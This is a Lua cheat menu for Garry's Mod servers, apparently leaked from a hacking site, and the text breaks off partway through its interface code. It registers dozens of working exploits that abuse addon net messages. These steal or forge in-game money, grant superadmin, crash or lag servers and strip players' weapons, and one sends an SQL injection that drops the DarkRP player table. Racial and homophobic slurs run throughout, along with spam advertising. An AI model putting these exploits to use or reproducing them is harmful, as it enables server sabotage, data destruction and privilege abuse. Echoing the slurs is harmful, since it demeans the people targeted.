-- Dumped and Released by Grampa @ Citizenhack.me
-- Citizenhack.me/Drama

local odium = nil /*

local Color = Color

local Material = Material

local net = net

local pcall = pcall

local error = error

local isstring = isstring

local istable = istable

local table = table

local timer = timer

*/



local LOKI = {}

LOKI.memory = {}



local grad = Material( "gui/gradient" )

local upgrad = Material( "gui/gradient_up" )

local downgrad = Material( "gui/gradient_down" )



local ctext = chat.AddText

function LOKI.ChatText( str )

    ctext( Color( 220, 220, 220 ), "[Loki] "..str )

end



function LOKI.NetStart( str )

    local netstart = net.Start

    if odium and odium.G and odium.G.net then

        netstart = odium.G.net.Start

    else

--        print( "sending netmessage in insecure mode" )

    end

    return netstart( str )

end





function LOKI.ValidNetString( str )

    local netstart = net.Start

    if odium and odium.G and odium.G.net then

        netstart = odium.G.net.Start

    else

--        print( "scanning for exploit in insecure mode" )

    end

	local status, error = pcall( netstart, str )

	return status

end



function LOKI.ValidNetString( str )

    local status, error = pcall( net.Start, str )

    return status

end





LOKI.sploits = {}

local severitycols = {

	[1] = Color( 80, 80, 120 ),

	[2] = Color( 80, 120, 80 ),

	[3] = Color( 150, 90, 50 ),

	[4] = Color( 150, 50, 0 ),

}



function LOKI.AddExploit( name, tab )

	if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end

	if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end

	LOKI.sploits[name] = tab

end



function LOKI.IsStored( addr )

    return LOKI.memory[addr] != nil

end



function LOKI.GetStored( addr, fallback )

    if fallback and LOKI.memory[addr] == nil then return fallback end

    return LOKI.memory[addr]

end



function LOKI.Store( addr, val )

    LOKI.memory[addr] = val

end



function LOKI.GetAllStored()

    return LOKI.memory

end



function LOKI.GetAllStoredData()

    local ret = {}

    for k, v in pairs( LOKI.memory ) do

        if !istable( v ) then ret[k] = v end

    end

    return ret

end



function LOKI.LoadConfig()

    local f = file.Read( "loki.dat", "DATA" )

    if !f then LOKI.ChatText( "YOU HAVEN'T SAVED A CONFIG FUCKING IDIOT" ) end

    local raw = util.Decompress( f )

    local garbage = util.JSONToTable( raw )

    table.Merge( LOKI.memory, garbage )

--    LOKI.memory = garbage

    LOKI.Menu:Remove()

    LOKI.ChatText( "Loaded Configuration File" )

end



function LOKI.SaveConfig()

    local myturds = util.TableToJSON( LOKI.GetAllStoredData() )

    if !myturds then return end

    local cumpressed = util.Compress( myturds )

    file.Write( "loki.dat", cumpressed )

    LOKI.ChatText( "Saved Configuration File" )

end











//////////////////////////////////////////////- SPLOITS -////////////////////////////////////////////////









/*

LOKI.AddExploit( "Test Sploit", {

    desc = "Does nothing, used for menu testing",

    severity = 1,

    scan = function() return true end,

    functions = {

        { typ = "float", name = "Niggers to kill", default = 1, min = 0, max = 100, addr = "testfloat" },

        { typ = "string", name = "Enter a gay cunt", default = "you", addr = "teststring" },

        { typ = "players", addr = "testplayers" },

        { typ = "func", name = "Fist his holes", func = function() print( LOKI.GetStored( "teststring", "" ).." is such a fucking gay nigger omg" ) end, },

    },

} )

*/







LOKI.AddExploit( "Customizable Printers Money Stealer", {

    desc = "Instantly jew all money from every printer on the server",

    severity = 3,

    scan = function() return LOKI.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,

    functions = {

        { typ = "func", name = "Gimme some shekels", func = function()

            if !timer.Exists( "loki_shekels" ) then

                LOKI.ChatText( "Starting shekel grabber" )

                timer.Create( "loki_shekels", 0.1, 0, function()

                    for k, v in pairs(ents.GetAll()) do

                        if( v:GetClass():find("print") ) then

                            LOKI.NetStart( "SyncPrinterButtons76561198056171650" )

                            net.WriteEntity(v)

                            net.WriteUInt(2, 4)

                            net.SendToServer()

                        end

                    end

                end)

            else

                timer.Remove( "loki_shekels" )

                LOKI.ChatText( "Stopping shekel grabber" )

            end

        end, },

    },

} )



LOKI.AddExploit( "ULX Friends Spam", {

    desc = "Spams everybody on the server with a message",

    severity = 1,

    scan = function() return (LOKI.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,

    functions = {

        { typ = "string", name = "Enter a message", default = "GET ODIUM.PRO", addr = "fr_spamstring" },

        { typ = "players", addr = "fr_players" },

        { typ = "func", name = "Big Spams", func = function()

            if !timer.Exists( "bigspams" ) then

                LOKI.ChatText( "Starting big spams" )

                timer.Create( "bigspams", 0.5, 0, function()

                    local t = LOKI.GetStored( "fr_players", {} )

                    for k, v in pairs( player.GetAll() ) do

                        if !table.HasValue( t, v ) then continue end

                        local buyit = {}

                        for i = 1, 15 do

                            table.insert( buyit, LOKI.GetStored( "fr_spamstring", "GET CITIZENHACK.ME" ) )

                        end

                        LOKI.NetStart( "sendtable" )

                        net.WriteEntity( v )

                        net.WriteTable( buyit )

                        net.SendToServer()

                    end

                end)

            else

                timer.Remove( "bigspams" )

                LOKI.ChatText( "Stopping big spams" )

            end

        end, },

    },

} )



LOKI.AddExploit( "Console Error Spammer", {

    desc = "Fuck up the server rcon with massed errors (found by invalid)",

    severity = 1,

    scan = function() return LOKI.ValidNetString( "steamid2" ) end,

    functions = {

        { typ = "func", name = "Big Spams", func = function()

            if !timer.Exists( "loki_errorz" ) then

                LOKI.ChatText( "Starting error spam" )

                timer.Create( "loki_errorz", 0.1, 0, function()

                    LOKI.NetStart( "steamid2" )

                    net.WriteString( "FAGGOT" )

                    net.SendToServer()

                end)

            else

                timer.Remove( "loki_errorz" )

                LOKI.ChatText( "Stopping error spam" )

            end

        end, },

    },

} )











LOKI.AddExploit( "Turbo Error Spammer", {

    desc = "Fuck up the server rcon with massed errors (untracable)",

    severity = 2,

    scan = function() return LOKI.ValidNetString( "steamid2" ) end,

    functions = {

        { typ = "func", name = "Big Spams", func = function()

            if !timer.Exists( "loki_errorzt" ) then

                LOKI.ChatText( "Starting error spam" )

                timer.Create( "loki_errorzt", 0, 0, function()

                    for i = 1, 100 do

                        LOKI.NetStart( "steamid2" )

                        net.WriteString( "FAGGOT" )

                        net.SendToServer()

                    end

                end)

            else

                timer.Remove( "loki_errorzt" )

                LOKI.ChatText( "Stopping error spam" )

            end

        end, },

    },

} )



LOKI.AddExploit( "Give superadmin", {

    desc = "Give people superadmin (rejoin for it to take effect)",

    severity = 4,

    scan = function() return LOKI.ValidNetString( "pplay_deleterow" ) end,

    functions = {

        { typ = "players", addr = "l_superadmins" },

        { typ = "func", name = "Gibsmedat", func = function()

            local t = LOKI.GetStored( "l_superadmins", {} )



            for k, v in pairs( player.GetAll() ) do

                if !table.HasValue( t, v ) then continue end

                local id = v:SteamID()

                local tbl = {}

                tbl.name = "FAdmin_PlayerGroup"

                tbl.where = {

                    "steamid",

                    tostring(id)

                }

                LOKI.NetStart("pplay_deleterow")

                net.WriteTable(tbl)

                net.SendToServer()



                local tbl = {}

                tbl.tblname = "FAdmin_PlayerGroup"

                tbl.tblinfo = {

                    tostring(id),

                    "superadmin"

                }

                LOKI.NetStart("pplay_addrow")

                net.WriteTable(tbl)

                net.SendToServer()

                LOKI.ChatText( "Gave superadmin to "..v:Nick() )

            end

        end, },

    },

} )



LOKI.AddExploit( "Break DarkRP", {

    desc = "Vandalize the darkrp master SQL database, permenantly erasing all darkrp player data",

    severity = 4,

    scan = function() return LOKI.ValidNetString( "pplay_sendtable" ) end,

    functions = {

        { typ = "func", name = "Burn it down", func = function()

            local tbl = {}

            tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"

            tbl.ply = LocalPlayer()

            LOKI.NetStart("pplay_sendtable")

            net.WriteTable(tbl)

            net.SendToServer()

            LOKI.ChatText( "Server SQL database de_stroyed" )

        end, },

    },

} )



LOKI.AddExploit( "Vandalize Server Data", {

    desc = "Vandalize the servers data folder, probably won't do any real damage but will annoy their devs",

    severity = 3,

    scan = function() return LOKI.ValidNetString( "WriteQuery" ) end,

    functions = {

        { typ = "func", name = "Do it", func = function()

            if !timer.Exists( "loki_datatrasher" ) then

                LOKI.ChatText( "Starting data folder rape" )

                timer.Create( "loki_datatrasher", 0.5, 0, function()

                    LOKI.NetStart( "WriteQuery" )

                    net.WriteString( "BUY CITIZENHACK.ME"..string.rep( "!", math.random( 1, 50 ) ) )

                    net.SendToServer()

                end)

            else

                timer.Remove( "loki_datatrasher" )

                LOKI.ChatText( "Stopping data folder rape" )

            end

        end, },

    },

} )



LOKI.AddExploit( "Turbo Chat Spam", {

    desc = "Big chat spames, extremely annoying",

    severity = 1,

    scan = function() return LOKI.ValidNetString( "VJSay" ) end,

    functions = {

        { typ = "string", name = "Enter a message", default = "GET CITIZENHACK.ME", addr = "vj_spamstring" },

        { typ = "string", name = "Enter a sound path", default = "vo/npc/male01/hacks01.wav", addr = "vj_spamsound" },

        { typ = "func", name = "Big Spams", func = function()

            if !timer.Exists( "bigspamsvj" ) then

                LOKI.ChatText( "Starting big spams" )

                timer.Create( "bigspamsvj", 0.1, 0, function()

                    for k, v in pairs( player.GetAll() ) do

                        LOKI.NetStart( "VJSay" )

                        net.WriteEntity( v )

                        net.WriteString( LOKI.GetStored( "vj_spamstring", "GET CITIZENHACK.ME USE CODE APOONA FOR 20% OFF ON CHECKOUT" ) )

                        if LOKI.GetStored( "vj_spamsound", "" ) != "" then

                            net.WriteString( LOKI.GetStored( "vj_spamsound", "" ) )

                        end

                        net.SendToServer()

                    end

                end)

            else

                timer.Remove( "bigspamsvj" )

                LOKI.ChatText( "Stopping big spams" )

            end

        end, },

    },

} )





LOKI.AddExploit( "Free Shekels", {

    desc = "Give yourself a crapton of money",

    severity = 3,

    scan = function() return LOKI.ValidNetString( "SendMoney" ) end,

    functions = {

        { typ = "func", name = "Give me shekels", func = function()

            LOKI.NetStart( "SendMoney" )

            net.WriteEntity( LocalPlayer() )

            net.WriteEntity( LocalPlayer() )

            net.WriteEntity( LocalPlayer() )

            net.WriteString( "-1000000" )

            net.SendToServer()

        end, },

        { typ = "func", name = "Give everybody shekels", func = function()

            for k, v in pairs( player.GetAll() ) do

                LOKI.NetStart( "SendMoney" )

                net.WriteEntity( v )

                net.WriteEntity( v )

                net.WriteEntity( v )

                net.WriteString( "-1000000" )

                net.SendToServer()

            end

        end, },

        { typ = "func", name = "Make everybody poor", func = function()

            for k, v in pairs( player.GetAll() ) do

                LOKI.NetStart( "SendMoney" )

                net.WriteEntity( v )

                net.WriteEntity( v )

                net.WriteEntity( v )

                net.WriteString( "100000000" )

                net.SendToServer()

            end

        end, },

    },

} )



LOKI.AddExploit( "Free Shekels #2", {

    desc = "Give yourself a crapton of money",

    severity = 2,

    scan = function() return LOKI.ValidNetString( "BailOut" ) end,

    functions = {

        { typ = "func", name = "Give me shekels", func = function()

            for k, v in pairs(player.GetAll()) do

                LOKI.NetStart( "BailOut" )

                net.WriteEntity( LocalPlayer() )

                net.WriteEntity( v )

                net.WriteFloat( -1000000  )

                net.SendToServer()

            end

        end, },

    },

} )



LOKI.AddExploit( "Printer Smasher", {

    desc = "Apply constant damage to any printers nearby",

    severity = 2,

    scan = function() return LOKI.ValidNetString( "customprinter_get" ) end,

    functions = {

        { typ = "func", name = "Smash dem printers", func = function()

            if !timer.Exists( "loki_printersmasher" ) then

                LOKI.ChatText( "Starting Printer Smasher" )

                timer.Create( "loki_printersmasher", 0, 0, function()

                    for k, v in pairs( ents.GetAll() ) do

                        if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then

                            LOKI.NetStart("customprinter_get")

                            net.WriteEntity(v)

                            net.WriteString("onoff")

                            net.SendToServer()

                        end

                    end

                end)

            else

                timer.Remove( "loki_printersmasher" )

                LOKI.ChatText( "Stopping Printer Smasher" )

            end

        end, },

    },

} )





LOKI.AddExploit( "Crash the Server", {

    desc = "Pretty much what it says on the can, discovered by Niku",

    severity = 4,

    scan = function() return LOKI.ValidNetString( "textstickers_entdata" ) end,

    functions = {

        { typ = "func", name = "Crash Jackson", func = function()

            LOKI.NetStart( "textstickers_entdata" )

            net.WriteUInt( 0xFFFFFFF, 32 )

            net.SendToServer()

        end, },

    },

} )



local names = { "Nigger", "Faggot", "Kike", "Cuckmaster", "Skid", "GetCitizenHack", "CitizenHackDotMe", "Shit", "Piss", "Permavirgin", "CitizenRat", "Feminist", "Fuckhead", "Cunt", "CitizenHack", "CockWart", "DickTickle", "FuckAdmins", "Paidmin", "ShitServer" }



LOKI.AddExploit( "Fuck up RPnames", {

    desc = "Destroy everybodys RPnames",

    severity = 2,

    scan = function() return LOKI.ValidNetString( "NC_GetNameChange" ) end,

    functions = {

        { typ = "func", name = "Renamer", func = function()

            if !timer.Exists( "loki_renamer" ) then

                LOKI.ChatText( "Starting Renamer" )

                timer.Create( "loki_renamer", 5, 0, function()

                    for k, v in pairs( player.GetAll() ) do

                        LOKI.NetStart("NC_GetNameChange")

                        net.WriteEntity(v)

                        net.WriteString(table.Random(names))

                        net.WriteString(table.Random(names))

                        net.SendToServer()

                    end

                end)

            else

                timer.Remove( "loki_renamer" )

                LOKI.ChatText( "Stopping Renamer" )

            end

        end, },

    },

} )



LOKI.AddExploit( "Lagsploit", {

    desc = "Lag the shit out of the server",

    severity = 3,

    scan = function() return LOKI.ValidNetString( "ATS_WARP_REMOVE_CLIENT" ) end,

    functions = {

        { typ = "func", name = "Big Lags", func = function()

            if !timer.Exists( "loki_lagsploit1" ) then

                LOKI.ChatText( "Starting Lag" )

                timer.Create( "loki_lagsploit1", 0.02, 0, function()

                    for k,v in pairs(player.GetAll()) do

                        LOKI.NetStart( "ATS_WARP_REMOVE_CLIENT" )

                        net.WriteEntity( v )

                        net.WriteString( "adminroom1" )

                        net.SendToServer()

                        LOKI.NetStart( "ATS_WARP_FROM_CLIENT" )

                        net.WriteEntity( v )

                        net.WriteString( "adminroom1" )

                        net.SendToServer()

                        LOKI.NetStart( "ATS_WARP_VIEWOWNER" )

                        net.WriteEntity( v )

                        net.WriteString( "adminroom1" )

                        net.SendToServer()

                    end

                end)

            else

                timer.Remove( "loki_lagsploit1" )

                LOKI.ChatText( "Stopping Lag" )

            end

        end, },

    },

} )





LOKI.AddExploit( "Lagsploit #2", {

    desc = "Lag the shit out of the server (patched on some servers)",

    severity = 3,

    scan = function() return LOKI.ValidNetString( "CFJoinGame" ) end,

    functions = {

        { typ = "func", name = "Big Lags", func = function()

            if !timer.Exists( "loki_lagsploit2" ) then

                LOKI.ChatText( "Starting Lag" )

                timer.Create( "loki_lagsploit2", 0.01, 0, function()

                    for k,v in pairs(player.GetAll()) do

                        LOKI.NetStart( "CFRemoveGame" )

                        net.WriteFloat( math.Round( "10000\n" ) )

                        net.SendToServer()

                        LOKI.NetStart( "CFJoinGame" )

                        net.WriteFloat( math.Round( "10000\n" ) )

                        net.SendToServer()

                        LOKI.NetStart( "CFEndGame" )

                        net.WriteFloat( "10000\n" )

                        net.SendToServer()

                    end

                end)

            else

                timer.Remove( "loki_lagsploit2" )



                LOKI.ChatText( "Stopping Lag" )

            end

        end, },

    },

} )





LOKI.AddExploit( "Console Spam", {

    desc = "Supposed to be a lagsploit but doesn't actually cause lag, just spams console",

    severity = 3,

    scan = function() return ULib end,

    functions = {

        { typ = "func", name = "Big Spames", func = function()

            if !timer.Exists( "loki_bigspames2" ) then

                LOKI.ChatText( "Starting Lag" )

                timer.Create( "loki_bigspames2", 0, 0, function()

                    for i = 1, 200 do

                        LocalPlayer():ConCommand( "_u CitizenHackDotMe" )

                    end

                end)

            else

                timer.Remove( "loki_bigspames2" )

                LOKI.ChatText( "Stopping Lag" )

            end

        end, },

    },

} )





LOKI.AddExploit( "Lagsploit #4", {

    desc = "Extreme high velocity armor piercing lag (Discovered by invalid)",

    severity = 3,

    scan = function() return LOKI.ValidNetString( "Keypad" ) end,

    functions = {

        { typ = "func", name = "Big Lags", func = function()

            if !timer.Exists( "loki_lagsploit4" ) then

                LOKI.ChatText( "Starting Lag" )

                timer.Create( "loki_lagsploit4", 0, 0, function()

                    for i = 1, 1000 do

                    LOKI.NetStart("Keypad")

                    net.WriteEntity(LocalPlayer())

                    net.SendToServer()

                    end

                end)

            else

                timer.Remove( "loki_lagsploit4" )

                LOKI.ChatText( "Stopping Lag" )

            end

        end, },

    },

} )



LOKI.AddExploit( "Lagsploit #5", {

    desc = "Moves the server onto an african ISP (Discovered by niku)",

    severity = 4,

    scan = function() return LOKI.ValidNetString( "CreateCase" ) end,

    functions = {

        { typ = "func", name = "Big Lags", func = function()

            if !timer.Exists( "loki_lagsploit5" ) then

                LOKI.ChatText( "Starting Lag" )

                timer.Create( "loki_lagsploit5", 0.02, 0, function()

                    for i = 1, 300 do

                    LOKI.NetStart( "CreateCase" )

                    net.WriteString( "tapped by citizenhack.me" )

                    net.SendToServer()

                    end

                end)

            else

                timer.Remove( "loki_lagsploit5" )

                LOKI.ChatText( "Stopping Lag" )

            end

        end, },

    },

} )



LOKI.AddExploit( "Lagsploit #6", {

    desc = "Gee i wonder what this does (Discovered by niku)",

    severity = 4,

    scan = function() return LOKI.ValidNetString( "rprotect_terminal_settings" ) end,

    functions = {

        { typ = "func", name = "Big Lags", func = function()

            if !timer.Exists( "loki_lagsploit6" ) then

                LOKI.ChatText( "Starting Lag" )

                timer.Create( "loki_lagsploit6", 0.02, 0, function()

                    for i = 1, 200 do

                    LOKI.NetStart( "rprotect_terminal_settings" )

                    net.WriteEntity( LocalPlayer() )

                    net.SendToServer()

                    end

                end)

            else

                timer.Remove( "loki_lagsploit6" )

                LOKI.ChatText( "Stopping Lag" )

            end

        end, },

    },

} )



LOKI.AddExploit( "Lagsploit #7", {

    desc = "Sure is a lot of lagsploits in this thing huh?",

    severity = 4,

    scan = function() return LOKI.ValidNetString( "StackGhost" ) end,

    functions = {

        { typ = "func", name = "Big Lags", func = function()

            if !timer.Exists( "loki_lagsploit7" ) then

                LOKI.ChatText( "Starting Lag" )

                timer.Create( "loki_lagsploit7", 0.015, 0, function()

                    for i = 1, 8 do

                        for k,v in pairs( player.GetAll() ) do

                            LOKI.NetStart( "StackGhost" )

                            net.WriteInt(69,32)

                            net.SendToServer()



                        end

                    end

                end)

            else

                timer.Remove( "loki_lagsploit7" )

                LOKI.ChatText( "Stopping Lag" )

            end

        end, },

    },

} )





LOKI.AddExploit( "Zombie Mode", {

    desc = "Get straight back up again after being killed",

    severity = 1,

    scan = function() return LOKI.ValidNetString( "RevivePlayer" ) end,

    functions = {

        { typ = "func", name = "Make me Immortal", func = function()

            if !timer.Exists( "loki_zombie" ) then

                LOKI.ChatText( "Becoming a zombie" )

                timer.Create( "loki_zombie", 0.5, 0, function()

                    if !LocalPlayer():Alive() then

                        LOKI.NetStart("RevivePlayer")

                        net.WriteEntity(LocalPlayer())

                        net.SendToServer()

                    end

                end)

            else

                timer.Remove( "loki_zombie" )

                LOKI.ChatText( "Becoming mortal again" )

            end

        end, },

    },

} )



LOKI.AddExploit( "Steal Police Guns", {

    desc = "Grab police weapons from the armory, has a 5 minute cooldown",

    severity = 1,

    scan = function() return LOKI.ValidNetString( "ARMORY_RetrieveWeapon" ) end,

    functions = {

        { typ = "func", name = "Get M16", func = function()

            LOKI.NetStart("ARMORY_RetrieveWeapon")

            net.WriteString("weapon1")

            net.SendToServer()

        end, },

        { typ = "func", name = "Get Shotgun", func = function()

            LOKI.NetStart("ARMORY_RetrieveWeapon")

            net.WriteString("weapon2")

            net.SendToServer()

        end, },

        { typ = "func", name = "Get Sniper", func = function()

            LOKI.NetStart("ARMORY_RetrieveWeapon")

            net.WriteString("weapon3")

            net.SendToServer()

        end, },

    },

} )



LOKI.AddExploit( "Poseidon Report Spammer", {

    desc = "Spam reports on everybody on the server",

    severity = 1,

    scan = function() return LOKI.ValidNetString( "TransferReport" ) end,

    functions = {

        { typ = "func", name = "Report Everybody", func = function()

            for k, v in pairs( player.GetAll() ) do

                LOKI.NetStart( "TransferReport" )

                net.WriteString( v:SteamID() )

                net.WriteString( "INFERNUS AND BAT ARE FAGGOTS FOR EACH OTHER" )

                net.WriteString( "DITCH THIS SHITTY SERVER AND BUY CITIZENHACK.ME TODAY" )

                net.SendToServer()

            end

        end, },

    },

} )



LOKI.AddExploit( "SAC tap", {

    desc = "Instantly 1tap any server running simplicity anticheat (Discovered by invalid)",

    severity = 4,

    scan = function() return LOKI.ValidNetString( "SimplicityAC_aysent" ) end,

    functions = {

        { typ = "func", name = "Crash it", func = function()

            local tbl = {}

            for i=1,400 do

                tbl[i] = i

            end

            LOKI.NetStart("SimplicityAC_aysent")

            net.WriteUInt(1, 8)

            net.WriteUInt(4294967295, 32)

            net.WriteTable(tbl)

            net.SendToServer()

        end, },

    },

} )



LOKI.AddExploit( "1tap Server", {

    desc = "Click this button for instant win.  Credits to invalid for contributing this",

    severity = 4,

    scan = function() return LOKI.ValidNetString( "pac_to_contraption" ) end,

    functions = {

        { typ = "func", name = "Crash it", func = function()

            local tbl = {}

            for i=1,1000000000 do

                tbl[#tbl + 1] = i

            end

            LOKI.NetStart("pac_to_contraption")

            net.WriteTable( tbl )

            net.SendToServer()

        end, },

    },

} )



local function nukeweapon( ent )

    if !ent:IsValid() then return end

    if ent.LNextNuke and ent.LNextNuke > CurTime() then return end

    LOKI.NetStart("properties")

    net.WriteString("remove")

    net.WriteEntity( ent )

    net.SendToServer()

    ent.LNextNuke = CurTime() + 0.5

end



local function nukeallweapons( tab )

    for k, v in pairs( tab ) do

        if !v:IsValid() then continue end

        if v.LNextNuke and v.LNextNuke > CurTime() then continue end

        LOKI.NetStart("properties")

        net.WriteString("remove")

        net.WriteEntity( v )

        net.SendToServer()

    end

end





LOKI.AddExploit( "Strip Weapons", {

    desc = "Strip weapons from anybody",

    severity = 3,

    scan = function() return LOKI.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,

    functions = {

        { typ = "string", name = "Strip Weapon Types", default = "*", addr = "stripper_gunz" },

        { typ = "players", addr = "stripper_plyz" },

        { typ = "func", name = "Toggle Stripper", func = function()

            if !timer.Exists( "stripclub" ) then

                LOKI.ChatText( "Starting strip club" )

                timer.Create( "stripclub", 0.5, 0, function()

                    local t = LOKI.GetStored( "stripper_plyz", {} )

                    for k, v in pairs( player.GetAll() ) do

                        if !table.HasValue( t, v ) then continue end

                        local gunz = v:GetWeapons()

                        local findstring = LOKI.GetStored( "stripper_gunz", "*" )

                        if findstring == "*" then nukeallweapons( gunz ) return end

                        local findstringtab = string.Explode( ", ", findstring )



                        for _, g in pairs( gunz ) do

                            for _, s in pairs( findstringtab ) do

                                if string.find( string.lower( g:GetClass() ), s ) then

                                    nukeweapon( g )

                                end

                            end

                        end



                    end

                end)

            else

                timer.Remove( "stripclub" )

                LOKI.ChatText( "Stopping strip club" )

            end

        end, },

    },

} )







//////////////////////////////////////////////- MENU UTILS -////////////////////////////////////////////////









function LOKI.MakeFunctionButton( parent, x, y, btext, func, tooltip)

if !parent:IsValid() then return end



local TButton = vgui.Create( "DButton" )

TButton:SetParent( parent )

TButton:SetPos( x, y )

TButton:SetText( btext )

TButton:SetTextColor( Color(255, 255, 255, 255) )

TButton:SizeToContents()

TButton:SetTall( 24 )

if tooltip then TButton:SetToolTip( tooltip ) end



TButton.Paint = function( self, w, h )

    surface.SetDrawColor( Color(60, 60, 60, 200) )

    surface.DrawRect( 0, 0, w, h )

    surface.SetDrawColor( Color( 60, 60, 60 ) )

    surface.SetMaterial( downgrad )

    surface.DrawTexturedRect( 0, 0, w, h/ 2 )



    surface.SetDrawColor( Color(100, 100, 100, 255) )

    surface.DrawOutlinedRect( 0, 0, w, h )

end





TButton.DoClick = function()

	func()

end



return TButton:GetWide(), TButton:GetTall()

end





















function LOKI.MakePlayerSelectionButton( parent, x, y, addr )

if !parent:IsValid() then return end



local TButton = vgui.Create( "DButton" )

TButton:SetParent( parent )

TButton:SetPos( x, y )

TButton:SetText( "Choose Targets" )

TButton:SetTextColor( Color(255, 255, 255, 255) )

TButton:SizeToContents()

TButton:SetTall( 24 )



TButton.Paint = function( self, w, h )

    surface.SetDrawColor( Color(60, 60, 90, 200) )

    surface.DrawRect( 0, 0, w, h )

    surface.SetDrawColor( Color( 60, 60, 60 ) )

    surface.SetMaterial( downgrad )

    surface.DrawTexturedRect( 0, 0, w, h/ 2 )



    surface.SetDrawColor( Color(100, 100, 100, 255) )

    surface.DrawOutlinedRect( 0, 0, w, h )



    surface.SetDrawColor( Color(70, 70, 100, 255) )

    surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )



end





TButton.DoClick = function()

    LOKI.SelectPlayersPanel( addr )

end



return TButton:GetWide(), TButton:GetTall()

end







function LOKI.SelectPlayersPanel( addr )

    if LOKI.PlayerSelector and LOKI.PlayerSelector:IsVisible() then LOKI.PlayerSelector:Remove() end



    local plytab = LOKI.GetStored( addr, {} )



    LOKI.PlayerSelector = vgui.Create("DFrame")

    LOKI.PlayerSelector:SetSize(250,400)

    LOKI.PlayerSelector:SetTitle("Select players to target")

    LOKI.PlayerSelector:SetPos( gui.MouseX(), gui.MouseY() )

    LOKI.PlayerSelector:MakePopup()



    LOKI.PlayerSelector.Paint = function( s, w, h )

        if !LOKI.Menu or !LOKI.Menu:IsVisible() then s:Remove() return end

        surface.SetDrawColor( Color(30, 30, 30, 245) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color(55, 55, 55, 245) )

        surface.DrawOutlinedRect( 0, 0, w, h )

        surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

    end



    local Plist = vgui.Create( "DPanelList", LOKI.PlayerSelector )

    Plist:SetSize( LOKI.PlayerSelector:GetWide() - 10, LOKI.PlayerSelector:GetTall() - 55 )

    Plist:SetPadding( 5 )

    Plist:SetSpacing( 5 )

    Plist:EnableHorizontal( false )

    Plist:EnableVerticalScrollbar( true )

    Plist:SetPos( 5, 40 )

    Plist:SetName( "" )





    local target1 = vgui.Create("DButton", LOKI.PlayerSelector)

    target1:SetSize( 40, 20 )

    target1:SetPos( 10, 23 )

    target1:SetText("All")

    target1:SetTextColor(Color(255, 255, 255, 255))

    target1.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 100 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    target1.DoClick = function()

        for _, p in pairs(player.GetAll()) do

            if not table.HasValue( plytab, p ) then

                table.insert( plytab, p )

            end

        end

        LOKI.Store( addr, plytab )

    end



    local target2 = vgui.Create("DButton", LOKI.PlayerSelector)

    target2:SetSize( 40, 20 )

    target2:SetPos( 55, 23 )

    target2:SetText("None")

    target2:SetTextColor(Color(255, 255, 255, 255))

    target2.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 100 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    target2.DoClick = function()

        table.Empty( plytab )

        LOKI.Store( addr, plytab )

    end



    local target3 = vgui.Create("DButton", LOKI.PlayerSelector )

    target3:SetSize( 40, 20 )

    target3:SetPos( 100, 23 )

    target3:SetText("Me")

    target3:SetTextColor(Color(255, 255, 255, 255))

    target3.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 100 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    target3.DoClick = function()

        table.Empty( plytab )

        table.insert( plytab, LocalPlayer() )

        LOKI.Store( addr, plytab )

    end



    local target4 = vgui.Create( "DTextEntry", LOKI.PlayerSelector )

    target4:SetPos( 145, 23 )

    target4:SetSize( 95, 20 )

    target4:SetText( "" )

    target4.OnChange = function( self )

        local nam = self:GetValue()

        local namtab = string.Explode( ", ", nam )

        table.Empty( plytab )

        for _, pl in pairs( player.GetAll() ) do

            for _, s in pairs( namtab ) do

                if string.find( string.lower( pl:Nick() ), s ) then

                   table.insert( plytab, pl )

                end

            end

        end

        LOKI.Store( addr, plytab )

    end



    for k, v in pairs( player.GetAll() ) do

        local plypanel2 = vgui.Create( "DPanel" )

        plypanel2:SetPos( 0, 0 )

        plypanel2:SetSize( 200, 25 )

        local teamcol = team.GetColor( v:Team() )

        plypanel2.Paint = function( s, w, h )

            if !v:IsValid() then return end

            surface.SetDrawColor( Color(30, 30, 30, 245) )

            surface.DrawRect( 0, 0, w, h )

            surface.SetDrawColor( teamcol )

            surface.DrawRect( 0, h - 3, w, 3 )

            surface.SetDrawColor( Color(55, 55, 55, 245) )

            surface.DrawOutlinedRect( 0, 0, w, h )

            if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(55, 255, 55, 245) ) end

            surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

        end



        local plyname = vgui.Create( "DLabel", plypanel2 )

        plyname:SetPos( 10, 5 )

        plyname:SetFont( "Trebuchet18" )

        local tcol = Color( 255, 255, 255 )

        if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end

        plyname:SetColor( tcol )

        plyname:SetText( v:Nick() )

        plyname:SetSize(180, 15)



        local faggot = vgui.Create("DButton", plypanel2 )

        faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )

        faggot:SetPos( 0, 0 )

        faggot:SetText("")

        faggot.Paint = function(panel, w, h)

            return

        end

        faggot.DoClick = function()

            if table.HasValue( plytab, v ) then

                table.RemoveByValue( plytab, v )

            else

                table.insert( plytab, v )

            end

            LOKI.Store( addr, plytab )

        end



    Plist:AddItem( plypanel2 )



    end



end













function LOKI.MakeTextInputButton( parent, x, y, btext, default, addr)

if !parent:IsValid() then return end



local hostframe = vgui.Create( "DPanel", parent )

hostframe:SetPos( x, y )



hostframe.Paint = function( self, w, h )

    surface.SetDrawColor( Color(60, 60, 60, 200) )

    surface.DrawRect( 0, 0, w, h )

